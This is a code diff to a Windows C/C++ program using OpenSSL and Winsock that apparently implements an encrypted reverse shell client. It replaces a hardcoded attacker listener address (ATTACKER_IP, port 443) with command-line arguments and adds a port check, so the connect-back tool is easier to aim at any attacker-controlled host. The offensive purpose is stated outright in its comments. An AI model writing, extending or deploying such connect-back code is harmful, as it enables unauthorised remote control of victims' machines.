@@ -3,6 +3,7 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <stdio.h>
+#include<iostream>
 #pragma comment(lib,"WS2_32")
 #pragma comment (lib, "crypt32")
 #pragma warning(disable:4996) 
@@ -37,12 +38,25 @@ void CleanupSSL()
     EVP_cleanup();
 }
 
-int main() {
+int main(int argc, char* argv[]) {
     // Initialize Winsock
     WSADATA wsaData;
-    // listener ip, port on attacker's machine
-    char* ATTACKER_IP = (char*)"192.168.100.10";
-    short ATTACKER_PORT = 443;
+
+    // listener ip, port on attacker's machine as arguments
+    if (argc != 3) {
+        std::cerr << "Usage: " << argv[0] << " <ATTACKER_IP> <ATTACKER_PORT>" << std::endl;
+        return 1;
+    }
+
+    // Get arguments
+    char* ATTACKER_IP = argv[1];
+    short ATTACKER_PORT = static_cast<short>(std::atoi(argv[2]));
+
+    // Validate input (optional, basic checks)
+    if (ATTACKER_PORT <= 0 || ATTACKER_PORT > 65535) {
+        std::cerr << "Error: Port must be between 1 and 65535." << std::endl;
+        return 1;
+    }
 
     WSAStartup(MAKEWORD(2, 2), &wsaData);
 
